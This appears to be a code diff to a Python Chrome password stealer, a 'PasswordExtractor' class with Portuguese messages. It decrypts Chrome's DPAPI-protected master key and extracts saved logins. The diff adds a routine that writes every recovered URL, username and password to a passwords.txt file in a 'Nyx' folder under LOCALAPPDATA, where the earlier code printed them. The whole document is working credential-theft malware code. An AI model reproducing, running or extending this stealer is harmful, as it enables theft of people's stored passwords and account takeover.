@@ -19,7 +19,7 @@ class PasswordExtractor:
             
             encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
             
-            encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove o prefixo "DPAPI"
+            encrypted_key = base64.b64decode(encrypted_key)[5:]  
             
             decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
             
@@ -96,6 +96,15 @@ class PasswordExtractor:
     def GetRandomString(self, length: int) -> str:
         return base64.urlsafe_b64encode(os.urandom(length)).decode()[:length]
 
+    def SavePasswordsToFile(self, passwords: list[tuple[str, str, str]], file_path: str) -> None:
+        try:
+            with open(file_path, 'w', encoding='utf-8') as file:
+                for url, username, password in passwords:
+                    file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
+            print(f"Senhas salvas em: {file_path}")
+        except Exception as e:
+            print(f"Erro ao salvar senhas em arquivo: {e}")
+
 if __name__ == "__main__":
     browser_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
     extractor = PasswordExtractor(browser_path)
@@ -103,7 +112,11 @@ if __name__ == "__main__":
     passwords = extractor.GetPasswords()
     
     if passwords:
-        for url, username, password in passwords:
-            print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n")
+        nyx_path = os.path.join(os.getenv("LOCALAPPDATA"), "Nyx")
+        if not os.path.exists(nyx_path):
+            os.makedirs(nyx_path)
+        
+        passwords_file_path = os.path.join(nyx_path, "passwords.txt")
+        extractor.SavePasswordsToFile(passwords, passwords_file_path)
     else:
         print("Nenhuma senha encontrada.")
